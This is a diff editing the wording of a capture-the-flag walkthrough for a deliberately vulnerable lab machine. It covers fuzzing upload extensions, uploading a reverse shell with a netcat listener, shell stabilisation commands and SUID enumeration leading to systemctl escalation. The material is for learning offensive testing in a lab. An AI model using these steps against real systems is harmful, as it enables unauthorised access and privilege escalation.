@@ -157,13 +157,13 @@ Let's capture any file upload request using the BurpSuite proxy and then send th
 
 <br />
 
-Under Payloads, we choose the wordlist Sniper will iterate through and ensure that URL-encoding is disabled.
+Under Payloads, we choose the wordlist Sniper will iterate through, as well as ensure that URL-encoding is disabled.
 
 ![image](https://user-images.githubusercontent.com/14150485/173319810-2d9f1f8e-5e47-40f5-8afd-12dacd63acc0.png)
 
 <br />
 
-This is a common file extension fuzz, for the purposes of which I used `extensions-most-common.fuzz.txt`, part of the `SecLists` wordlist suite.
+This is a common file extension check against the upload form, for the purposes of which I used `extensions-most-common.fuzz.txt`, part of the `SecLists` wordlist suite.
 
 The results will all return a `200` status code which is to be expected, seeing as there is a valid server response, however that is not of much use for our purposes - The response length however is definitely a useful hint:
 
@@ -180,7 +180,7 @@ Download the reverse shell as instructed on the task, edit the local IP and port
 
 <br />
 
-Start a `netcat` listener on your local machine.
+We start a `netcat` listener on our local machine using the port number specified on the reverse shell script.
 
 ```
 ╭─root@kali ~  
@@ -190,7 +190,7 @@ listening on [any] 4524 ...
 
 <br />
 
-The reverse shell we uploaded on the target machine is located under the `/internal/uploads` folder:
+The script file we uploaded on the target machine is located under the `/internal/uploads` folder:
 
 ```
 http://10.10.46.142:3333/internal/uploads/
@@ -198,7 +198,7 @@ http://10.10.46.142:3333/internal/uploads/
 
 <br />
 
-Clicking on the file establishes our connection to the machine.
+Clicking on the file establishes connection to the machine.
 
 ```
 ╭─root@kali ~  
@@ -215,7 +215,7 @@ $
 
 <br />
 
-Although not mandatory, my preference is to stabilize shells to avoid accidentally losing connection. The target machine seems to have `python` installed which makes this easy for us.
+Although not mandatory, my preference is to stabilize shells to avoid accidental loss of access. The target machine seems to have `python` installed which makes this easy for us.
 
 On the target machine, we run the following command:
 
@@ -225,7 +225,7 @@ python -c "import pty; pty.spawn('/bin/bash')"
 
 <br />
 
-Then put it in the background which will return us to our local shell:
+Then put it in the background, which will briefly return us to our local shell:
 
 ```
 Ctrl + Z
@@ -233,7 +233,7 @@ Ctrl + Z
 
 <br />
 
-We then use the following command locally:
+Then use the following command locally:
 
 ```
 stty raw -echo && fg
@@ -249,7 +249,7 @@ export TERM=xterm-256-color
 
 <br />
 
-Now that we have stabilized our shell, the first step should be to check the `/home` directory for any hints or pointers.
+Now that we have a stabilized shell, our next step should be to check the `/home` directory for any hints or pointers.
 
 ```
 www-data@vulnuniversity:/$ cd /home
@@ -318,7 +318,7 @@ www-data@vulnuniversity:/home/bill$ find / -perm /4000 -type f -exec ls -ld {} \
 
 <br />
 
-Looking through the list, the `/bin/systemctl` stands out as it is a utility responsible for examining and controlling the `systemd` system and service manager. In `systemd` services are referred to as `units` which are resources the system administrates via the corresponding `unit files`.
+Looking through the list, the `/bin/systemctl` stands out, as it is a utility responsible for examining and controlling the `systemd` system and service manager. In `systemd` services are referred to as `units`, which serve as resources the system administrates via the corresponding `unit files`.
 
 Searching for `systemctl` on [GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/) we find a reference to an exploit that we can use when the file has `SUID` permissions.
 
